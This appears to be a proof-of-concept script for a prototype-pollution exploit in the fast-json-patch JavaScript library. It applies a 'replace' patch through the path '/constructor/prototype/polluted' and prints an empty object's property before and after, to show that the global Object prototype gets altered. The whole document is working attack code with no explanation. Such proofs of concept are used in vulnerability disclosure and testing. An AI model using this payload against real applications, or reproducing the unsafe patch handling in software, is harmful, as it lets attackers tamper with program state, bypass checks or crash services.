var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
let fp = require('fast-json-patch');
const patch = [{
        op: 'replace',
        path: '/constructor/prototype/polluted',
        value: 'yes'
    }];
console.log({}.polluted);
fp.applyPatch(obj, patch);
console.log({}.polluted);